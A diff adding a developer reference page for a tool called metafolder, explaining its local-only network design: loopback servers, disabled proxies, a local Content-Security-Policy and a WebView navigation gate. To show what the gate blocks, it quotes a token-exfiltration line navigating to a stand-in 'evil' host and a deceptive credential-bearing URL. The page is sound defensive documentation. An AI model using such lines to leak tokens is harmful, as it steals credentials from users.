@@ -1,0 +1,21 @@
+title: No network access
+tags: Security
+kind: reference
+audience: dev
+aliases: network proxy csp
+summary: Nothing in metafolder can reach a remote host: loopback servers, no proxy, a local-only CSP and a navigation gate for the WebView.
+
+metafolder never talks to the internet, and nothing in it can:
+
+* ''Listening'': the daemon (`127.0.0.1:7523`) and the GUI server (`127.0.0.1:7524`), loopback only, behind the [[Session tokens]].
+* ''Outgoing, from Rust'': the GUI's client to the daemon and the CLI's build loopback URLs only, follow no redirect, and use ''no proxy''. The GUI's HTTP library follows `HTTP_PROXY`/`ALL_PROXY` by default, loopback included, which would hand the token and repository data to whatever proxy the environment names — so its client is built with the proxy off (`crates/gui/tests/no_system_proxy.rs`); the CLI's reads no proxy variable. The configuration's git library does no remote operation. The media helpers have no network interface at all ([[Sandboxing the media decoders]]).
+* ''Tauri'': its default capability only — no `http` plugin, no `shell` plugin.
+* ''The WebView'', the one real risk: a full browser engine, in the realm holding the GUI's token, the file API and the `!` shell commands. Its proxy is off too (its media URLs carry the token), and two gates keep it local:
+** a ''Content-Security-Policy'' whose every source is local — `'self'`, loopback (the GUI port is configurable, hence `http://127.0.0.1:*`), Tauri's IPC — so no `fetch`, `<img>` or `import()` reaches a remote origin; `object-src` and `frame-src` are `'none'` ([[Why /fsraw never serves a document]]);
+** a ''navigation policy'': no CSP directive governs top-level navigation, so `location.href = 'https://evil/?' + token` would otherwise leave. Any navigation outside the app's own origins is refused (an unreadable target too). The target is ''parsed'', never prefix-matched — `http://127.0.0.1:x@evil.example/` starts like a loopback URL but its host is `evil.example` — and a URL carrying credentials is refused outright.
+
+The one deliberate exception: `!` shell commands, which you typed, and which can
+obviously run `curl`.
+
+Guarded by `crates/gui/tests/network_surface.rs` (the CSP admits no remote source)
+and the navigation tests of `sandbox`.
